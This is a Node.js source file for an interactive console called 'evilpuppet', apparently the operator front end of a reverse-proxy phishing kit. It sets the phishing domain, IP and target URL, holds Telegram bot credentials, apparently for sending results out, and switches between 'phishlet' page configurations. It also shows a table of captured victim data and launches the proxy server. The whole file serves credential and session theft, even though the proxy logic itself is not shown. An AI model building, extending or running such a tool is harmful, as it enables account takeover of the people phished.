const fs = require('fs');
const path = require('path');
const { program } = require('commander');
const { fork } = require('child_process');
const readline = require('readline');
const chalk = require('chalk');
const { saveConfig, loadConfig } = require('./config');
const { showSessionTable } = require('./table');
const { runServer } = require('./core');

let serverProcess = null;

const configCmd = program
  .command('config')
  .description('Configuration setup')
  .action(() => {
    try {
      const config = loadConfig();
      console.log(chalk.green('Current configuration:'));
      console.log(chalk.green(`Domain: ${config.domain || 'not installed'}`));
      console.log(chalk.green(`IP: ${config.ip || 'not installed'}`));
      console.log(chalk.green(`Target URL: ${config.target || 'not installed'}`));
      console.log(chalk.green(`Port: ${config.port || 'not installed'}`));
      console.log(chalk.green(`Scheme: ${config.scheme || 'not installed'}`));
      console.log(chalk.green(`Telegram Bot Token: ${config.telegramBotToken || 'not installed'}`));
      console.log(chalk.green(`Telegram Chat ID: ${config.telegramChatId || 'not installed'}`));
      console.log(`\nUsage: config <command>
Configuration setup

Commands:
  domain <domain>              Install domain
  ip <ip>                      Install IP
  target <url>                 Install target URL
  port <port>                  Install port
  scheme <scheme>              Install scheme (http/https)
  telegramBotToken <token>     Install Telegram Bot Token
  telegramChatId <chatId>      Install Telegram Chat ID`);
    } catch (error) {
      console.error(`Ошибка: ${error.message}`);
    }
  });

configCmd
  .command('domain <domain>')
  .description('Set domain')
  .action((domain) => {
    try {
      const config = loadConfig();
      config.domain = domain;
      saveConfig();
      console.log(chalk.green(`Domain installed: ${domain}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('ip <ip>')
  .description('Install IP')
  .action((ip) => {
    try {
      const config = loadConfig();
      config.ip = ip;
      saveConfig();
      console.log(chalk.green(`IP installed: ${ip}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('target <url>')
  .description('Set target URL')
  .action((url) => {
    try {
      const config = loadConfig();
      config.target = url;
      saveConfig();
      console.log(chalk.green(`Target URL set: ${url}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('port <port>')
  .description('Set port')
  .action((port) => {
    try {
      const config = loadConfig();
      config.port = parseInt(port);
      saveConfig();
      console.log(chalk.green(`Port installed: ${port}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('scheme <scheme>')
  .description('Install scheme (http/https)')
  .action((scheme) => {
    try {
      if (['http', 'https'].includes(scheme)) {
        const config = loadConfig();
        config.scheme = scheme;
        saveConfig();
        console.log(chalk.green(`Схема установлена: ${scheme}`));
      } else {
        console.error('The scheme must be http or https');
      }
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('telegramBotToken <token>')
  .description('Install Telegram Bot Token')
  .action((token) => {
    try {
      const config = loadConfig();
      config.telegramBotToken = token;
      saveConfig();
      console.log(chalk.green(`Telegram Bot Token installed: ${token}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

configCmd
  .command('telegramChatId <chatId>')
  .description('Set Telegram Chat ID')
  .action((chatId) => {
    try {
      const config = loadConfig();
      config.telegramChatId = chatId;
      saveConfig();
      console.log(chalk.green(`Telegram Chat ID is installed: ${chatId}`));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

const phishletCmd = program
  .command('phishlet')
  .description('Configuration management proxy_page')
  .action(() => {
    try {
      console.log(`Usage: phishlet <command>
Configuration management proxy_page

Commands:
  list             List of available configurations proxy_page
  enable <name>    Activate configuration proxy_page`);
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

phishletCmd
  .command('list')
  .description('List of available configurations proxy_page')
  .action(() => {
    try {
      const proxyPageDir = path.join(__dirname, 'proxy_page');
      const files = fs.readdirSync(proxyPageDir).filter(file => file.endsWith('.js'));
      console.log(chalk.green('Available Configurations phishlet:'));
      files.forEach(file => console.log(chalk.green(file.replace('.js', ''))));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

phishletCmd
  .command('enable <name>')
  .description('Activate configuration proxy_page')
  .action((name) => {
    try {
      const proxyPagePath = path.join(__dirname, 'proxy_page', `${name}.js`);
      if (fs.existsSync(proxyPagePath)) {
        const proxyConfig = require(proxyPagePath);
        const config = loadConfig();
        config.phishlet = name;
        config.target = proxyConfig.target_url;
        saveConfig();
        console.log(chalk.green(`Cofnig ${name} activated, target: ${config.target}`));
      } else {
        console.error(`Config ${name} not found`);
      }
    } catch (error) {
      console.error(`Ошибка: ${error.message}`);
    }
  });

program
  .command('show config')
  .description('show config')
  .action(() => {
    try {
      const config = loadConfig();
      console.log(chalk.green('Current configuration:'));
      console.log(chalk.green(JSON.stringify(config, null, 2)));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

program
  .command('session')
  .description('Show captured data table')
  .action(() => {
    try {
      showSessionTable();
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

program
  .command('run')
  .description('run server')
  .action(() => {
    try {
      if (serverProcess) {
        console.log('server running');
        return;
      }
      serverProcess = fork(path.join(__dirname, 'core.js'), [], {
        env: { CONFIG: JSON.stringify(loadConfig()) },
        stdio: ['pipe', 'pipe', 'pipe', 'ipc']
      });
      serverProcess.stdout.on('data', (data) => console.log(data.toString().trim()));
      serverProcess.stderr.on('data', (data) => console.error(data.toString().trim()));
      serverProcess.on('exit', (code) => {
        console.log(`server stop ${code}`);
        serverProcess = null;
      });
      console.log(chalk.green('The server is running in the background. Logs in server.log'));
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

program
  .command('stop')
  .description('stop server')
  .action(() => {
    try {
      if (serverProcess) {
        serverProcess.kill('SIGTERM');
        serverProcess = null;
        console.log(chalk.green('server stope'));
      } else {
        console.log('The server is not running');
      }
    } catch (error) {
      console.error(`error: ${error.message}`);
    }
  });

async function startInteractiveMode() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'evilpuppet> '
  });

  rl.prompt();

  rl.on('line', async (line) => {
    const args = line.trim().split(/\s+/);
    if (!args[0]) {
      rl.prompt();
      return;
    }
    try {
      await program.parseAsync(args, { from: 'user' });
    } catch (error) {
      console.error(`error: ${error.message}`);
      console.log('Try "help" for a list of commands.');
    }
    rl.prompt();
  });

  rl.on('close', () => {
    if (serverProcess) {
      serverProcess.kill('SIGTERM');
    }
    process.exit(0);
  });
}

module.exports = { startInteractiveMode };